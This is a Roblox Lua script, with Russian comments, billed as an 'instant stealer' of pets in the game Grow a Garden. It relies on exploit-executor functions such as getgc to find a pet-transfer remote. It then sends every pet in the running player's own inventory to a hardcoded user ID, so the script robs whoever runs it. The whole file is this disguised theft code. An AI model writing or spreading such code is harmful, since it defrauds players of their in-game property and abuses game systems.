-- Grow a Garden INSTANT STEALER v13.0
-- Максимально агрессивная кража всех питомцев за один запуск

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local YOUR_USER_ID = 3793906492

print("=== INSTANT STEALER ЗАПУЩЕН ===")
print("Цель: украсть всех питомцев с одного запуска")

local transferRemote = nil

-- 1. Поиск через descendants
for _, v in pairs(ReplicatedStorage:GetDescendants()) do
    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
        local name = v.Name:lower()
        if name:find("transfer") or name:find("givepet") or name:find("claimpet") or name:find("sendpet") or name:find("pettransfer") then
            transferRemote = v
            print("✓ Найден remote: " .. v.Name)
            break
        end
    end
end

-- 2. Если не нашли — ищем через getgc
if not transferRemote then
    print("Поиск через getgc...")
    for _, v in pairs(getgc(true)) do
        if typeof(v) == "function" then
            local info = debug.getinfo(v)
            if info.name then
                local n = info.name:lower()
                if n:find("transfer") or n:find("givepet") or n:find("claimpet") or n:find("sendpet") then
                    transferRemote = v
                    print("✓ Найден через getgc: " .. info.name)
                    break
                end
            end
        end
    end
end

if not transferRemote then
    print("❌ Remote НЕ НАЙДЕН! Скрипт не сможет работать.")
    return
end

-- ==================== КРАЖА ВСЕХ ПИТОМЦЕВ ====================
local function stealAllPets()
    print("Начинаю кражу всех питомцев...")

    local folders = {
        LocalPlayer:FindFirstChild("Pets"),
        LocalPlayer.PlayerGui:FindFirstChild("PetInventory"),
        LocalPlayer:FindFirstChild("PlayerData"),
        workspace:FindFirstChild(LocalPlayer.Name)
    }

    local total = 0

    for _, folder in ipairs(folders) do
        if folder then
            for _, pet in ipairs(folder:GetDescendants()) do
                if pet:IsA("Folder") or pet:IsA("Model") or pet:IsA("StringValue") then
                    pcall(function()
                        local args = {pet, YOUR_USER_ID, "transfer"}
                        
                        if typeof(transferRemote) == "function" then
                            transferRemote(unpack(args))
                        else
                            if transferRemote:IsA("RemoteEvent") then
                                transferRemote:FireServer(unpack(args))
                            elseif transferRemote:IsA("RemoteFunction") then
                                transferRemote:InvokeServer(unpack(args))
                            end
                        end
                    end)
                    
                    total = total + 1
                    task.wait(0.07)
                end
            end
        end
    end

    print("=== КРАЖА ЗАВЕРШЕНА ===")
    print("Попыток кражи: " .. total)
    print("Все питомцы должны быть у тебя на аккаунте.")
end

-- Запуск
task.wait(1.5)
stealAllPets()

-- Дополнительный цикл на всякий случай
task.wait(3)
stealAllPets()
